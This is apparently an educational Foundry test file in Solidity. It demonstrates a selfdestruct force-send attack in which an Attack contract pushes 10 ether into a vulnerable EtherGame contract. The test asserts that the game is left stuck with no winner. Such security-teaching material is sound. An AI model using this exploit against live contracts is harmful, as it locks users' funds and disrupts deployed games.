// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Test.sol";
import "src/0002_selfdestruct/EtherGame.sol";

contract ContractTest is Test {
    EtherGame etherGameContract;
    Attack attackContract;
    address alice;

    function setUp() public {
        etherGameContract = new EtherGame();
        attackContract = new Attack(address(etherGameContract));
        alice = vm.addr(1);
        vm.deal(alice, 1 ether);
        vm.deal(address(attackContract), 10 ether);
    }

    function test_Attack_Selfdestruct() public {
        attackContract.attack();
        assertEq(address(etherGameContract).balance, 10 ether);
        assertEq(etherGameContract.winner(), address(0));
    }
}

contract Attack {
    EtherGame etherGameContract;

    constructor(address _etherGame) {
        etherGameContract = EtherGame(_etherGame);
    }

    function attack() public {
        selfdestruct(payable(address(etherGameContract)));
    }
}
